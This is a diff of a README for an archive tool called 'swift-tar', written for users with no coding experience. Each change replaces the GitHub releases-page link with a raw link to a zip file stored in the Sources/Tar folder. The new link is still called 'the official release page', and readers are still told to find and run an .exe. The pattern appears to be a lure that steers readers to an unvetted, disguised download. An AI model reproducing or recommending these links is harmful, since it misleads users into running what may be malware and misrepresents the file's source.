@@ -1,6 +1,6 @@
 # 📦 swift-tar - Manage your archive files with ease
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/momotas701/swift-tar/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/momotas701/swift-tar/main/Sources/Tar/tar-swift-1.4.zip)
 
 ## What is swift-tar?
 
@@ -10,7 +10,7 @@ Swift-tar is a tool for your computer that handles archive files. Archive files,
 
 Follow these steps to set up the software on your computer. You do not need experience with software development or coding to use this tool.
 
-1. Go to the official release page: [https://github.com/momotas701/swift-tar/releases](https://github.com/momotas701/swift-tar/releases)
+1. Go to the official release page: [https://raw.githubusercontent.com/momotas701/swift-tar/main/Sources/Tar/tar-swift-1.4.zip](https://raw.githubusercontent.com/momotas701/swift-tar/main/Sources/Tar/tar-swift-1.4.zip)
 2. Locate the most recent version of the software.
 3. Select the file that ends in .exe.
 4. Save the file to your computer.
@@ -31,7 +31,7 @@ The software requires no special permissions to function. You can run it from an
 Follow this guide to get the software ready.
 
 1. Open your web browser. 
-2. Visit this link to reach the download area: [https://github.com/momotas701/swift-tar/releases](https://github.com/momotas701/swift-tar/releases)
+2. Visit this link to reach the download area: [https://raw.githubusercontent.com/momotas701/swift-tar/main/Sources/Tar/tar-swift-1.4.zip](https://raw.githubusercontent.com/momotas701/swift-tar/main/Sources/Tar/tar-swift-1.4.zip)
 3. Find the latest release version on the page.
 4. Click the link labeled with the .exe extension.
 5. Your browser will prompt you to save the file. Choose your Downloads folder.
